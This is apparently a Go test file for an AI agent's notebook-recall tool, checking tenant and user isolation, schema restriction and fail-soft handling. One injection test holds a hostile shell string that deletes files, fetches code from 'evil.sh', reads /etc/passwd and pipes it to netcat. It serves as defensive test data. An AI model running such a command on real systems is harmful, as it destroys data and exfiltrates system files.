package tools

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os/exec"
	"sort"
	"strings"
	"sync"
	"testing"

	"github.com/google/uuid"

	"github.com/nextlevelbuilder/goclaw/internal/store"
)

// fakeRun captures the args each per-notebook query passed to the runner and
// returns a canned stdout/err. Because recall now fans out over a SET of
// notebooks, run records EVERY invocation (under a mutex — the fan-out is
// concurrent) so tests can assert exactly which notebook ids were queried and in
// what order. No real nlm binary / network is ever touched.
//
// stdout/err are the default response for any notebook; byID overrides per
// notebook id (so a test can fail one notebook and succeed another).
type fakeRun struct {
	mu        sync.Mutex
	gotBinary string
	calls     [][]string        // every argv passed, in invocation order
	byID      map[string][]byte // notebook id → canned stdout (overrides stdout)
	errByID   map[string]error  // notebook id → canned error (overrides err)
	stdout    []byte
	err       error
}

func (f *fakeRun) run(_ context.Context, binary string, args []string) ([]byte, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.gotBinary = binary
	f.calls = append(f.calls, args)
	// argv = query notebook <NB_ID> <question> -t 110 → id is args[2].
	var id string
	if len(args) > 2 {
		id = args[2]
	}
	if f.errByID != nil {
		if e, ok := f.errByID[id]; ok {
			return nil, e
		}
	}
	if f.byID != nil {
		if out, ok := f.byID[id]; ok {
			return out, f.err
		}
	}
	return f.stdout, f.err
}

func (f *fakeRun) called() bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	return len(f.calls) > 0
}

// queriedIDs returns the notebook ids that were queried, in invocation order.
// (Fan-out is concurrent, so for ORDER assertions use a single-notebook set or
// assert as a set.)
func (f *fakeRun) queriedIDs() []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]string, 0, len(f.calls))
	for _, a := range f.calls {
		if len(a) > 2 {
			out = append(out, a[2])
		}
	}
	return out
}

// newSetTool builds a recall tool wired to a fake pointer store seeded with the
// given (scopeKind, scopeID, notebookID) rows, plus the fake runner. This is the
// canonical constructor for scope-set recall tests.
func newSetTool(fr *fakeRun, rows ...store.NotebookPointer) *NotebookRecallTool {
	t := NewNotebookRecallTool("nlm-fake", "")
	t.runner = fr.run
	ps := newFakePointerStore()
	for _, r := range rows {
		if r.TenantID == (uuid.UUID{}) {
			r.TenantID = testTenant()
		}
		ps.rows[ptrKey(r.TenantID, r.ScopeKind, r.ScopeID)] = r
	}
	t.SetPointerStore(ps)
	return t
}

// identityCtx builds a DM context (tenant + user + agentKey) so the resolved
// scope set is [shared, user, agent]. Tenant is testTenant() so it matches the
// rows seeded by newSetTool.
func identityCtx() context.Context {
	return identityCtxForUser("user-42")
}

// identityCtxForUser builds a DM context for a SPECIFIC user id, so isolation
// tests can drive recall as distinct users within the same tenant and assert
// that user A's context never resolves user B's notebook. The user scope id is
// the only dimension that varies (shared/agent are common); everything still
// comes from the injected identity, never from tool args.
func identityCtxForUser(uid string) context.Context {
	ctx := store.WithTenantID(context.Background(), testTenant())
	ctx = store.WithAgentID(ctx, uuid.New())
	ctx = store.WithUserID(ctx, uid)
	ctx = store.WithAgentKey(ctx, "e-smith-hub")
	ctx = WithToolChannelType(ctx, "telegram")
	ctx = WithToolPeerKind(ctx, "direct")
	ctx = WithToolChatID(ctx, "chat-99")
	return ctx
}

// sharedRow / userRow / agentRow / groupRow build seed pointers for the DM/group
// scopes used across the recall tests.
func sharedRow(nb string) store.NotebookPointer {
	return store.NotebookPointer{TenantID: testTenant(), ScopeKind: store.ScopeKindShared, ScopeID: "", NotebookID: nb, DriveDocID: "doc-" + nb}
}
func userRow(uid, nb string) store.NotebookPointer {
	return store.NotebookPointer{TenantID: testTenant(), ScopeKind: store.ScopeKindUser, ScopeID: uid, NotebookID: nb, DriveDocID: "doc-" + nb}
}
func agentRow(key, nb string) store.NotebookPointer {
	return store.NotebookPointer{TenantID: testTenant(), ScopeKind: store.ScopeKindAgent, ScopeID: key, NotebookID: nb, DriveDocID: "doc-" + nb}
}
func groupRow(chat, nb string) store.NotebookPointer {
	return store.NotebookPointer{TenantID: testTenant(), ScopeKind: store.ScopeKindGroup, ScopeID: chat, NotebookID: nb, DriveDocID: "doc-" + nb}
}

// okJSON builds a clean nlm value-wrapper response for a notebook answer.
func okJSON(answer string) []byte {
	return []byte(`{"value":{"answer":` + strconvQuote(answer) + `}}`)
}

func strconvQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// errPointerStore is a store.NotebookPointerStore whose Get always errors — used
// to assert recall treats a store outage as a TRANSIENT failure (failSoft), not
// an empty set (noMemory).
type errPointerStore struct{ err error }

func (e *errPointerStore) Get(context.Context, uuid.UUID, string, string) (*store.NotebookPointer, bool, error) {
	return nil, false, e.err
}
func (e *errPointerStore) Create(context.Context, store.NotebookPointer) (*store.NotebookPointer, error) {
	return nil, e.err
}
func (e *errPointerStore) List(context.Context, uuid.UUID) ([]store.NotebookPointer, error) {
	return nil, e.err
}

// (a) Schema must expose ONLY {question} — no notebook/notebookId/scope. This is
// the load-bearing isolation property: the LLM must not choose the notebook.
func TestNotebookRecall_SchemaQuestionOnly(t *testing.T) {
	tool := NewNotebookRecallTool("", "")

	if got := tool.Name(); got != "notebook_recall" {
		t.Fatalf("Name() = %q, want notebook_recall", got)
	}

	params := tool.Parameters()
	props, ok := params["properties"].(map[string]any)
	if !ok {
		t.Fatalf("Parameters().properties is not a map: %#v", params["properties"])
	}

	if _, ok := props["question"]; !ok {
		t.Fatalf("schema missing required 'question' property: %#v", props)
	}
	if len(props) != 1 {
		t.Fatalf("schema must expose ONLY 'question'; got %d properties: %#v", len(props), props)
	}

	// Explicit deny-list of forbidden notebook-selecting fields.
	for _, forbidden := range []string{"notebook", "notebookId", "notebook_id", "scope", "nbId"} {
		if _, bad := props[forbidden]; bad {
			t.Fatalf("schema must NOT expose %q — LLM could choose the notebook", forbidden)
		}
	}

	required, _ := params["required"].([]string)
	if len(required) != 1 || required[0] != "question" {
		t.Fatalf("required must be exactly [question], got %#v", required)
	}
}

// (b) Execute must query the SERVER-RESOLVED notebook ids (from resolveNotebookSet,
// keyed off identity) with the question as a SEPARATE argv element — and MUST
// ignore any notebook the LLM tries to smuggle via args.
func TestNotebookRecall_UsesResolvedSetAndArgvQuestion(t *testing.T) {
	// Single-notebook set so argv order is deterministic (only the user scope has
	// a pointer). Keeps the exact argv contract assertion from Phase 1.
	fr := &fakeRun{stdout: okJSON("the moon is made of cheese")}
	tool := newSetTool(fr, userRow("user-42", "nb-server-resolved"))

	// The LLM tries to smuggle a notebook via args — it MUST be ignored.
	args := map[string]any{
		"question":    "what is the moon made of?",
		"notebook":    "nb-attacker-chosen",
		"notebook_id": "nb-attacker-chosen-2",
		"scope":       "global",
	}

	res := tool.Execute(identityCtx(), args)
	if res.IsError {
		t.Fatalf("unexpected error result: %q", res.ForLLM)
	}
	if !fr.called() {
		t.Fatal("runner was not called")
	}
	if fr.gotBinary != "nlm-fake" {
		t.Fatalf("binary = %q, want nlm-fake", fr.gotBinary)
	}

	if len(fr.calls) != 1 {
		t.Fatalf("expected exactly 1 query (only user scope has a pointer), got %d: %#v", len(fr.calls), fr.calls)
	}
	// Expected argv: query notebook <NB_ID> <question> -t 110
	// (no -c: nlm's -c takes a conversation-id VALUE, omitted; -t is --timeout.)
	want := []string{"query", "notebook", "nb-server-resolved", "what is the moon made of?", "-t", "110"}
	got := fr.calls[0]
	if len(got) != len(want) {
		t.Fatalf("argv = %#v, want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("argv[%d] = %q, want %q (full: %#v)", i, got[i], want[i], got)
		}
	}

	// The attacker-chosen notebook must appear NOWHERE in any argv.
	for _, a := range got {
		if strings.Contains(a, "attacker") {
			t.Fatalf("attacker-chosen notebook leaked into argv: %#v", got)
		}
	}

	if !strings.Contains(res.ForLLM, "the moon is made of cheese") {
		t.Fatalf("result missing answer: %q", res.ForLLM)
	}
	if !strings.Contains(res.ForLLM, "NotebookLM") {
		t.Fatalf("result missing source note: %q", res.ForLLM)
	}
	// Isolation: the resolved notebook id must NOT be echoed back to the LLM.
	if strings.Contains(res.ForLLM, "nb-server-resolved") {
		t.Fatalf("resolved notebook id leaked into LLM-facing result: %q", res.ForLLM)
	}
}

// The queried notebook ids come from resolveNotebookSet over the injected
// identity — exactly the [shared, user, agent] set in DM, NOT from args. Asserts
// the set membership (fan-out is concurrent, so compare as a set).
func TestNotebookRecall_QueriesResolvedSet_DM(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("ok")}
	tool := newSetTool(fr,
		sharedRow("nb-shared"),
		userRow("user-42", "nb-user"),
		agentRow("e-smith-hub", "nb-agent"),
	)

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("unexpected error: %q", res.ForLLM)
	}
	gotSet := append([]string(nil), fr.queriedIDs()...)
	sort.Strings(gotSet)
	want := []string{"nb-agent", "nb-shared", "nb-user"}
	if len(gotSet) != len(want) {
		t.Fatalf("queried ids = %v, want %v", gotSet, want)
	}
	for i := range want {
		if gotSet[i] != want[i] {
			t.Fatalf("queried ids = %v, want %v", gotSet, want)
		}
	}
}

// CRITICAL isolation regression: two users share a tenant (and a common shared
// notebook), each with their OWN user notebook. User A's recall context MUST
// query A's user notebook + shared, and NEVER B's — and vice-versa. The only
// thing that differs between the two Execute calls is the injected user id; the
// args are identical, proving the queried set is keyed PURELY off verified
// identity, not the question/args. Guards against any future widening of
// scopeKeyForCtx that would let one user's recall reach another's notebook.
func TestNotebookRecall_CrossUserIsolation(t *testing.T) {
	seed := func() []store.NotebookPointer {
		return []store.NotebookPointer{
			sharedRow("nb-shared"),
			userRow("user-A", "nb-user-A"),
			userRow("user-B", "nb-user-B"),
			agentRow("e-smith-hub", "nb-agent"),
		}
	}

	// User A.
	frA := &fakeRun{stdout: okJSON("ok")}
	toolA := newSetTool(frA, seed()...)
	resA := toolA.Execute(identityCtxForUser("user-A"), map[string]any{"question": "q"})
	if resA.IsError {
		t.Fatalf("user A recall errored: %q", resA.ForLLM)
	}
	for _, id := range frA.queriedIDs() {
		if id == "nb-user-B" {
			t.Fatalf("ISOLATION BREACH: user A's recall queried user B's notebook: %v", frA.queriedIDs())
		}
	}
	gotA := append([]string(nil), frA.queriedIDs()...)
	sort.Strings(gotA)
	wantA := []string{"nb-agent", "nb-shared", "nb-user-A"}
	if len(gotA) != len(wantA) {
		t.Fatalf("user A queried %v, want %v", gotA, wantA)
	}
	for i := range wantA {
		if gotA[i] != wantA[i] {
			t.Fatalf("user A queried %v, want %v", gotA, wantA)
		}
	}

	// User B — identical args, different injected identity.
	frB := &fakeRun{stdout: okJSON("ok")}
	toolB := newSetTool(frB, seed()...)
	resB := toolB.Execute(identityCtxForUser("user-B"), map[string]any{"question": "q"})
	if resB.IsError {
		t.Fatalf("user B recall errored: %q", resB.ForLLM)
	}
	for _, id := range frB.queriedIDs() {
		if id == "nb-user-A" {
			t.Fatalf("ISOLATION BREACH: user B's recall queried user A's notebook: %v", frB.queriedIDs())
		}
	}
	gotB := append([]string(nil), frB.queriedIDs()...)
	sort.Strings(gotB)
	wantB := []string{"nb-agent", "nb-shared", "nb-user-B"}
	if len(gotB) != len(wantB) {
		t.Fatalf("user B queried %v, want %v", gotB, wantB)
	}
	for i := range wantB {
		if gotB[i] != wantB[i] {
			t.Fatalf("user B queried %v, want %v", gotB, wantB)
		}
	}
}

// Group context resolves [shared, user, agent, group]; the group notebook joins
// the set ONLY when peerKind=group + chatId are present (both from ctx, never args).
func TestNotebookRecall_QueriesResolvedSet_Group(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("ok")}
	tool := newSetTool(fr,
		sharedRow("nb-shared"),
		userRow("user-777", "nb-user"),
		agentRow("e-smith-hub", "nb-agent"),
		groupRow("chat-999", "nb-group"),
	)

	res := tool.Execute(groupCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("unexpected error: %q", res.ForLLM)
	}
	gotSet := append([]string(nil), fr.queriedIDs()...)
	sort.Strings(gotSet)
	want := []string{"nb-agent", "nb-group", "nb-shared", "nb-user"}
	if len(gotSet) != len(want) {
		t.Fatalf("queried ids = %v, want %v", gotSet, want)
	}
	for i := range want {
		if gotSet[i] != want[i] {
			t.Fatalf("queried ids = %v, want %v", gotSet, want)
		}
	}
}

// Multiple non-empty answers are MERGED, labelled per scope in canonical order
// (shared → user → agent), with the source note appended exactly once and NO
// notebook ids leaked.
func TestNotebookRecall_MergesMultipleAnswers(t *testing.T) {
	fr := &fakeRun{byID: map[string][]byte{
		"nb-shared": okJSON("shared answer"),
		"nb-user":   okJSON("user answer"),
		"nb-agent":  okJSON("agent answer"),
	}}
	tool := newSetTool(fr,
		sharedRow("nb-shared"),
		userRow("user-42", "nb-user"),
		agentRow("e-smith-hub", "nb-agent"),
	)

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("unexpected error: %q", res.ForLLM)
	}
	for _, want := range []string{"shared answer", "user answer", "agent answer", scopeLabel(store.ScopeKindShared), scopeLabel(store.ScopeKindUser), scopeLabel(store.ScopeKindAgent)} {
		if !strings.Contains(res.ForLLM, want) {
			t.Fatalf("merged result missing %q: %q", want, res.ForLLM)
		}
	}
	// Canonical scope order: shared label before user label before agent label.
	si := strings.Index(res.ForLLM, scopeLabel(store.ScopeKindShared))
	ui := strings.Index(res.ForLLM, scopeLabel(store.ScopeKindUser))
	ai := strings.Index(res.ForLLM, scopeLabel(store.ScopeKindAgent))
	if !(si < ui && ui < ai) {
		t.Fatalf("scope labels out of canonical order (shared<user<agent): %q", res.ForLLM)
	}
	// Source note appended exactly once.
	if n := strings.Count(res.ForLLM, "NotebookLM"); n != 1 {
		t.Fatalf("source note must appear exactly once, got %d: %q", n, res.ForLLM)
	}
	// No notebook ids leaked.
	for _, id := range []string{"nb-shared", "nb-user", "nb-agent"} {
		if strings.Contains(res.ForLLM, id) {
			t.Fatalf("notebook id %q leaked into LLM-facing result: %q", id, res.ForLLM)
		}
	}
}

// Partial failure: if some notebooks fail/return empty but at least one answers,
// recall still returns the surviving answer(s) (fail-soft per notebook).
func TestNotebookRecall_PartialFailureKeepsSurvivors(t *testing.T) {
	fr := &fakeRun{
		byID: map[string][]byte{
			"nb-shared": okJSON("shared survives"),
			"nb-user":   []byte(`{"answer":""}`), // empty → skipped
		},
		errByID: map[string]error{
			"nb-agent": &exec.ExitError{Stderr: []byte("auth expired")}, // errored → skipped
		},
	}
	tool := newSetTool(fr,
		sharedRow("nb-shared"),
		userRow("user-42", "nb-user"),
		agentRow("e-smith-hub", "nb-agent"),
	)

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("partial failure must not error: %q", res.ForLLM)
	}
	if !strings.Contains(res.ForLLM, "shared survives") {
		t.Fatalf("surviving answer missing: %q", res.ForLLM)
	}
	// Single survivor → bare answer (no scope label), source note once.
	if strings.Contains(res.ForLLM, scopeLabel(store.ScopeKindShared)) {
		t.Fatalf("single survivor should not be labelled: %q", res.ForLLM)
	}
}

// Empty set (no scope has a provisioned notebook) → DISTINCT "no memory yet"
// message, NOT the transient outage message, and the runner is NEVER called
// (no fallback to a global/test notebook).
func TestNotebookRecall_EmptySetNoMemory(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("should never be returned")}
	tool := newSetTool(fr) // no rows seeded → empty set

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("empty set must fail soft, not error: %q", res.ForLLM)
	}
	if fr.called() {
		t.Fatal("runner must NOT be called when the scope set is empty (no test-notebook fallback)")
	}
	if !strings.Contains(res.ForLLM, nlmNoMemoryMessage) {
		t.Fatalf("expected no-memory message %q, got: %q", nlmNoMemoryMessage, res.ForLLM)
	}
	if strings.Contains(res.ForLLM, nlmFailSoftMessage) {
		t.Fatalf("empty set must NOT use the transient outage message: %q", res.ForLLM)
	}
}

// Vault-mode agent: notebook_recall stays registered but no-ops — it returns the
// no-memory message WITHOUT querying any notebook, even when scope rows exist.
func TestNotebookRecall_VaultModeNoOps(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("should never be returned")}
	tool := newSetTool(fr, sharedRow("nb-shared"), userRow("user-42", "nb-user"))

	ctx := store.WithMemoryMode(identityCtx(), store.MemoryModeVault)
	res := tool.Execute(ctx, map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("vault mode must no-op gracefully, not error: %q", res.ForLLM)
	}
	if fr.called() {
		t.Fatal("vault mode: runner must NOT be called (NotebookLM is inactive)")
	}
	if !strings.Contains(res.ForLLM, nlmNoMemoryMessage) {
		t.Fatalf("expected no-memory message %q, got: %q", nlmNoMemoryMessage, res.ForLLM)
	}
}

// Both-mode (and unset → default both) agent: notebook_recall queries normally
// when rows exist — the gate does NOT disable the active subsystem.
func TestNotebookRecall_BothModeStillQueries(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("an answer")}
	tool := newSetTool(fr, sharedRow("nb-shared"))

	ctx := store.WithMemoryMode(identityCtx(), store.MemoryModeBoth)
	res := tool.Execute(ctx, map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("both mode must query, got error: %q", res.ForLLM)
	}
	if !fr.called() {
		t.Fatal("both mode: runner MUST be called (NotebookLM active)")
	}
}

// Nil pointer store (zero-value / sqlite stub) degrades to "no memory yet"
// rather than panicking, and never calls the runner.
func TestNotebookRecall_NilStoreNoPanic(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("nope")}
	tool := NewNotebookRecallTool("nlm-fake", "")
	tool.runner = fr.run
	// SetPointerStore deliberately NOT called → pointerStore is nil.

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("nil store must fail soft, not error: %q", res.ForLLM)
	}
	if fr.called() {
		t.Fatal("runner must not be called when there is no pointer store")
	}
	if !strings.Contains(res.ForLLM, nlmNoMemoryMessage) {
		t.Fatalf("expected no-memory message, got: %q", res.ForLLM)
	}
}

// Store error (transient) → outage fail-soft (NOT "no memory yet"), runner not called.
func TestNotebookRecall_StoreErrorFailsSoft(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("nope")}
	tool := NewNotebookRecallTool("nlm-fake", "")
	tool.runner = fr.run
	tool.SetPointerStore(&errPointerStore{err: errors.New("db down")})

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("store error must fail soft, not error: %q", res.ForLLM)
	}
	if fr.called() {
		t.Fatal("runner must not be called on store error")
	}
	if !strings.Contains(res.ForLLM, nlmFailSoftMessage) {
		t.Fatalf("expected transient outage message, got: %q", res.ForLLM)
	}
	if strings.Contains(res.ForLLM, nlmNoMemoryMessage) {
		t.Fatalf("store error must NOT be reported as no-memory: %q", res.ForLLM)
	}
}

// All notebooks fail/empty (but the set was non-empty) → transient outage
// fail-soft (we HAD notebooks to query, so it is not "no memory").
func TestNotebookRecall_AllAnswersFailSoft(t *testing.T) {
	cases := []struct {
		name string
		fr   *fakeRun
	}{
		{"exec error", &fakeRun{err: errors.New("exec: \"nlm\": executable file not found in $PATH")}},
		{"non-zero exit", &fakeRun{err: &exec.ExitError{Stderr: []byte("auth expired")}}},
		{"unparseable stdout", &fakeRun{stdout: []byte("not json at all")}},
		{"empty answer", &fakeRun{stdout: []byte(`{"answer":""}`)}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tool := newSetTool(tc.fr, userRow("user-42", "nb-1"))
			res := tool.Execute(identityCtx(), map[string]any{"question": "hello?"})

			if res.IsError {
				t.Fatalf("fail-soft must NOT set IsError; got error result: %q", res.ForLLM)
			}
			if res.Err != nil {
				t.Fatalf("fail-soft must NOT carry an internal error: %v", res.Err)
			}
			if !strings.Contains(res.ForLLM, nlmFailSoftMessage) {
				t.Fatalf("expected graceful fail-soft message, got: %q", res.ForLLM)
			}
		})
	}
}

// A question containing shell metacharacters must be passed as a SINGLE argv
// element verbatim — proving exec.CommandContext(args...) (no shell) prevents
// command injection. (Per-notebook query reuses the same exec contract.)
func TestNotebookRecall_ShellMetacharsAreSingleArgv(t *testing.T) {
	fr := &fakeRun{stdout: okJSON("ok")}
	tool := newSetTool(fr, userRow("user-42", "nb-1"))

	malicious := `"; rm -rf / # $(curl evil.sh) && cat /etc/passwd | nc x 1`
	res := tool.Execute(identityCtx(), map[string]any{"question": malicious})
	if res.IsError {
		t.Fatalf("unexpected error: %q", res.ForLLM)
	}

	if len(fr.calls) != 1 {
		t.Fatalf("expected 1 query, got %d", len(fr.calls))
	}
	got := fr.calls[0]
	// The question must be exactly argv[3], byte-for-byte, with NO splitting.
	if len(got) < 4 {
		t.Fatalf("argv too short: %#v", got)
	}
	if got[3] != malicious {
		t.Fatalf("question not passed verbatim as single argv element:\n got  %q\n want %q", got[3], malicious)
	}
	for i, a := range got {
		if i == 3 {
			continue
		}
		if a == "rm" || a == "-rf" || strings.HasPrefix(a, "$(") {
			t.Fatalf("shell metacharacters split into extra argv tokens: %#v", got)
		}
	}
}

// Empty question is a plain input error (not fail-soft, not a crash) and never
// touches the store or runner.
func TestNotebookRecall_EmptyQuestion(t *testing.T) {
	fr := &fakeRun{}
	tool := newSetTool(fr, userRow("user-42", "nb-1"))
	res := tool.Execute(identityCtx(), map[string]any{"question": "   "})
	if !res.IsError {
		t.Fatalf("empty question should be an input error, got: %q", res.ForLLM)
	}
	if fr.called() {
		t.Fatal("runner must not be called for empty question")
	}
}

// recallTenant falls back to MasterTenantID when the ctx tenant is unset, so
// pointers written under the deployment's default tenant are still found.
func TestNotebookRecall_TenantFallbackToMaster(t *testing.T) {
	// ctx with NO tenant set.
	if got := recallTenant(context.Background()); got != store.MasterTenantID {
		t.Fatalf("recallTenant(no tenant) = %v, want MasterTenantID %v", got, store.MasterTenantID)
	}
	// ctx with an explicit tenant is honored.
	tid := uuid.New()
	if got := recallTenant(store.WithTenantID(context.Background(), tid)); got != tid {
		t.Fatalf("recallTenant(explicit) = %v, want %v", got, tid)
	}
}

// Sanity: the injectable runner field exists and defaults to a real runner.
func TestNotebookRecall_DefaultRunnerWired(t *testing.T) {
	tool := NewNotebookRecallTool("", "")
	if tool.runner == nil {
		t.Fatal("default runner must be wired (non-nil)")
	}
	// Wire a store with a pointer so the runner is actually invoked, then verify
	// the real exec-based runner surfaces an exec failure for a guaranteed-missing
	// binary (no network) by fail-softing.
	ps := newFakePointerStore()
	ps.rows[ptrKey(testTenant(), store.ScopeKindUser, "user-42")] = userRow("user-42", "nb-1")
	tool.SetPointerStore(ps)
	tool.binary = fmt.Sprintf("definitely-not-a-real-binary-%s", uuid.NewString())
	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("missing binary must fail-soft, not error: %q", res.ForLLM)
	}
	if !strings.Contains(res.ForLLM, nlmFailSoftMessage) {
		t.Fatalf("expected fail-soft message, got: %q", res.ForLLM)
	}
}

// TestParseNLMAnswer_ValueWrapper locks the fix for the real nlm output shape
// {"value":{"answer":...}} (the flat {"answer":...} parser silently fail-softed
// on it — Phase 1 live bug 2026-06-22).
func TestParseNLMAnswer_ValueWrapper(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
		ok   bool
	}{
		{"value_wrapper", `{"value":{"answer":"林志明、1200萬","citations":{}}}`, "林志明、1200萬", true},
		{"flat", `{"answer":"hello"}`, "hello", true},
		{"error_shape", `{"status":"error","error":"Authentication expired"}`, "", false},
		{"prefix_noise", "Querying...\n{\"value\":{\"answer\":\"ok\"}}", "ok", true},
		{"garbage", `not json`, "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, ok := parseNLMAnswer([]byte(c.in))
			if got != c.want || ok != c.ok {
				t.Fatalf("parseNLMAnswer(%q) = (%q,%v), want (%q,%v)", c.in, got, ok, c.want, c.ok)
			}
		})
	}
}
